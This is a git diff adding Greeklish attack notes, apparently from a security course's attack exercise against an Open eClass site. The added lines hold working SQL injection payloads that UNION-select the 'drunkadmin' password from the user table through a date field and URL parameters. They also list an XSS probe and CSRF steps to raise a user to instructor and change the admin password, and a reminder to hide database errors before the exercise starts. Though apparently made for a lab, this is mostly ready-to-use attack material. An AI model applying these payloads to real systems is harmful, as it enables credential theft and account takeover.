@@ -2,6 +2,11 @@ SQL Injection Attack
 
 	Admin Attacks
 
+		-(Gia kathigiti h admin) http://eponymous.csec.gr/modules/usage/userlogins.php (EXEI KAI XSS alla me csrf)
+		Hmerominia enarksis kati normal
+		Hmerominia liksis: 2018-04-16 00:00:00') AND 1=2 UNION select 1,password,3 from eclass.user where username='drunkadmin'-- --
+
+
 		- http://eponymous.csec.gr/modules/admin/addusertocours.php?c=2%27%20AND%201=2%20UNION%20SELECT%20%272%20AND%202=3%20UNION%20SELECT%201,password,3%20FROM%20eclass.user%20where%20username=%22drunkadmin%22%20UNION%20SELECT%201,2,3%20FROM%20cours_user%20cu,user%20u%20WHERE%201=2%27--%20--
 
 		- http://eponymous.csec.gr/modules/course_info/infocours.php?from_home=TRUE&cid=TMA101%27%20AND%201=2%20UNION%20SELECT%20%221%22,%222%22,%223%22,password,%225%22,%226%22,%227%22,%228%22,%229%22,%2210%22%20FROM%20user%20where%20username=%22drunkadmin%22--%20--
@@ -106,3 +111,26 @@ http://eponymous.csec.gr/modules/admin/infocours.php?c=
 
 An kataferume na kanume update ton pinaka cours_user tote an kanume set statut=1
 tha gini o xristis mas admin
+
+
+-------------
+CSRF
+
+1)http://eponymous.csec.gr/modules/usage/userlogins.php
+XSS me tis hmerominies! px <script>alert('xss')</script> gia hmeromhnia enarksis
+
+2)http://eponymous.csec.gr/modules/admin/newuseradmin.php
+Symplhrwsh formas gia dhmioyrgia ekpaidefti, kai meta exume prosvasi kai se alla pragmata!
+(Opws px to http://eponymous.csec.gr/modules/usage/userlogins.php pu exi oraiotato injection)
+
+3)http://eponymous.csec.gr/modules/admin/edituser.php?u=9         (to id tu user mas anti gia 9)
+Submit forma me idiotita Εκπαιδευτης για να κανουμε τον χρηστη μας εκπαιδευτη
+
+4)http://eponymous.csec.gr/modules/admin/password.php?userid=1
+Αν το 1 ειναι το userid του drunkadmin (πολυ πιθανο) μπορουμε να του αλλαξουμε το password με csrf
+
+
+
+PRIN TELEISEI TO TIME ZERO:
+Na svisume tis malakies
+Na vgalume apo tin sinartisi db_query to error (na min emfanizetai pote)
